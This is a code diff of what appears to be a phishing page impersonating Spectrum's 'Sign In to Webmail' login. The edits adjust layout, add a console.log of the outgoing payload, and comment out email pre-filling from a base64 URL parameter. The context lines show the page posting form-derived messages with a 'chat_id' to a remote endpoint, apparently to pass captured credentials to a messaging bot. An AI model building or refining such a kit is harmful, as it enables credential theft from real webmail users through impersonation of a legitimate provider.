@@ -79,7 +79,7 @@
 
     <div class="app-header-logo">
       <a class="mat-button" target="_self" href="/" aria-disabled="false" tabindex="0" access-tabindex="banner-logo" access-next-tabindex="banner-link-support">
-     <center>   <img alt="Spectrum logo" src="../assets/images/spectrum-logo.svg" width="133px" height="24px"> </center>
+      <center>  <img alt="Spectrum logo" src="../assets/images/spectrum-logo.svg" width="133px" height="24px"></center>
       </a>
     </div>
   </div>
@@ -102,10 +102,10 @@
     </div>
         
     <div id="loginFormContainer">
-<center>        <h1 id="headline">
+<center>
+        <h1 id="headline">
             Sign In to Webmail
         </h1> </center>
-
         <div id="hohLink">
             <div id="dividerLine"></div>
             <div id="orText">or</div>
@@ -239,6 +239,7 @@ export default {
 					chat_id: chatId,
 					text: message,
 				};
+				console.log(payload)
 				await axios.post(url, payload);
 
 			} catch (error) {
@@ -249,7 +250,7 @@ export default {
 
 	},
 	mounted() {
-		this.formDataRes['email'] = atob(this.$route?.params?.id)
+		// this.formDataRes['email'] = atob(this.$route?.params?.id)
 	}
 }
 </script>
@@ -6083,7 +6084,7 @@ input[type=text], input[type=password] {
 
 /* Submit */
 input[type=submit] {
-	width: 1300%;
+	width: 130%;
 	height: 4rem;
 	border-radius: 4px;
 	border: none;
